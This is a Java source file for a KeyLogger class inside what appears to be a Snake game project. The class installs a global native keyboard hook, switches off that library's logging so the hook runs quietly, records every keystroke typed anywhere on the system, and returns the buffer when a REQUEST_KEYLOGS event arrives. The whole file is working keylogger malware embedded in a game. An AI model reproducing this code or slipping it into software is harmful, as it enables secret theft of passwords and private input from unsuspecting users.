package snake.logic.tools;

import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import snake.logic.enums.Changes;
import snake.logic.model.Model;

public class KeyLogger implements NativeKeyListener, PropertyChangeListener {
	private final Model model;
	private StringBuilder keys, lastSentKeys;

    public KeyLogger(Model model) {
		this.model = model;
		model.registerPropertyChangeListener(this);
    }

    public void start() throws NativeHookException {
		disableLogging();
		keys = new StringBuilder();

		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(this);
    }

	private void disableLogging() {
		LogManager.getLogManager().reset();

		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);

		logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

		if (keyText.length() > 1) {
			keys.append("[" + keyText + "]\n");
		} else {
			keys.append(keyText + "\n");
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {}
	public void nativeKeyTyped(NativeKeyEvent e) {}

	@Override
	public void propertyChange(PropertyChangeEvent evt) {
		switch (Changes.valueOf(evt.getPropertyName())) {
			case REQUEST_KEYLOGS:
				lastSentKeys = new StringBuilder(keys);
				model.firePropertyChange(Changes.REQUEST_KEYLOGS, lastSentKeys.toString(), keys.toString());
			default:
				break;
		}
	}
}
